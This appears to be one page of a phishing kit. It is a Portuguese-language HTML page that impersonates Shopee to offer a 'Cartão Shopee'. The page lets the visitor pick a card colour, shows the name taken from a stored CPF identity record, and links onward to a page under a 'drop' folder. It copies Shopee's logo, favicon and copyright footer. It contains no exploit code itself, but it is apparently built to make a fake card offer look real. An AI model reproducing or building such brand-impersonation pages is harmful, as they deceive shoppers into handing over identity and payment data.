    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, max-scale=1.0">
    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
    <title>Cartão Shopee - Carregando</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <style>
        .header {
            background: white;
            padding: 15px 0;
            text-align: center;
        }
        .main-content {
            max-width: 600px;
            background-color: white;
            text-align: center;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
            margin: 30px auto;
        }
        .color-options {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .color-options button {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 2px solid transparent;
            cursor: pointer;
            transition: border 0.3s ease;
        }
        .footer {
        background: #ffffff;
        border-top: 1px solid #e6e6e6;
        text-align: center;
        padding: 15px;
        font-size: 10px;
        color: #666;
    }
        .footer p {
            margin: 0; /* Remove espaçamento extra entre as linhas do rodapé */
        }
        .color-options button:hover {
            border-color: #6c63ff;
        }
        .color-options .selected {
            border-color: #6c63ff;
        }
        .btn-custom {
            background-color: #ee4d2d;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .btn-custom:hover {
            background-color: #000;
        }
        .cartao-container {
            position: relative;
            display: inline-block;
        }
        .cartao {
            width: var(--cartao-width, 350px);
            height: var(--cartao-height, 200px);
            border-radius: 15px;
            background: var(--cartao-bg, #1e90ff);
            color: white;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            font-family: Arial, sans-serif;
            position: relative;
            overflow: hidden;
        }
        .imagem-chip {
            width: 35px;
            position: absolute;
            top: 40%;
            left: 15px;
            transform: translateY(-50%);
        }
        .imagem-lateral {
            width: 30px;
            position: absolute;
            top: 40%;
            left: 60px;
            transform: translateY(-50%);
        }
        .top-left-text {
            position: absolute;
            top: 15px;
            left: 15px;
            width: 100px;
        }
        .top-right-img {
            width: 50px;
            position: absolute;
            top: 15px;
            right: 15px;   

        }
        .card-details {
            display: flex;
            justify-content: space-between;
            position: absolute;
            bottom: 20px;
            width: 90%;
            left: 5%;
        }
        .titular {
            text-align: left;
        }
        .valido {
            text-align: right;
        }
        .titular p, .valido p {
            margin: 0;
            font-size: 10px; /* Tamanho da fonte para o texto */
        }
        .texto {
            font-size: 14px; /* Tamanho da fonte do texto "Titular do Cartão" */
            text-transform: uppercase;
            color: #ffffff;
        }
    </style>
</head>

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">
    <div class="header">
        <img decoding="async" style="width: 120px;" src="images/shopee-logo.png" alt="Imagem Centralizada">
    </div>
    <div style="grid-area: content; padding: 0 1rem;">
        <div class="main-content">
            <h4 style="font-size: 20px;">Escolha o design do seu cartão</h4> <!-- Defina o tamanho aqui -->
            <p style="font-size: 16px;">Selecione o estilo que mais combina com você</p>
            <h6 style="font-size: 16px;">Escolha a cor do seu cartão</h6>
            <div class="color-options">
                <button style="background-color: #000;" class="selected"></button>
                <button style="background-color: #8420b3;"></button>
                <button style="background-color: #ee4d2d;"></button>
                <button style="background-color: #0454cc;"></button>
            </div>
            <div class="cartao-container">
                <div class="cartao">
                    <img src="images/Bank-1.png" alt="top-left-text" class="top-left-text">
                    <img src="images/Visa-logo-white.png" alt="Top-right logo" class="top-right-img">
                    <img src="images/chip-1-logo-png-transparent.png" alt="Chip do Cartão" class="imagem-chip">
                    <img src="images/Design-sem-nome.png" alt="Lateral logo" class="imagem-lateral">
                    <div class="card-details">
                        <div class="titular">
                            <p class="texto">Titular do Cartão</p>
                            <p id="titular-nome" style="font-size: 16px;">SEU NOME AQUI</p>
                        </div>
                        <div class="valido">
                            <p class="texto">Válido Até</p>
                            <p id="valido-data" style="font-size: 14px;">01/32</p>
                        </div>
                    </div>
                </div>
            </div>
            <button class="btn-custom" onclick="location.href='../drop/index.html'">CONTINUAR</button>
        </div>
    </div>
    <!-- Footer -->
    <div class="footer">
Copyright 2025 Shopee. Todos os direitos reservados.<br>

Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
    </div>
</div>

<script>
    document.addEventListener("DOMContentLoaded", function() {
        const dadosUsuario = JSON.parse(localStorage.getItem('dadosCPF'));
        if (dadosUsuario && dadosUsuario.nomeCompleto) {
            document.getElementById('titular-nome').innerText = dadosUsuario.nomeCompleto;
        } else {
            document.getElementById('titular-nome').innerText = "Nome Indisponível";
        }

        const corSelecionada = localStorage.getItem('cartaoCor');
        if (corSelecionada) {
            document.querySelector('.cartao').style.backgroundColor = corSelecionada;
            document.querySelector(`.color-options button[style*="${corSelecionada}"]`).classList.add('selected');
        }
    });

    const colorOptions = document.querySelectorAll('.color-options button');
    const cartao = document.querySelector('.cartao');

    colorOptions.forEach((button, index) => {
        button.addEventListener('click', () => {
            document.querySelector('.color-options .selected').classList.remove('selected');
            button.classList.add('selected');

            const colors = ['#000', '#8420b3', '#ee4d2d', '#0454cc'];
            const selectedColor = colors[index];

            cartao.style.background = selectedColor;
            localStorage.setItem('cartaoCor', selectedColor);
        });
    });
</script>
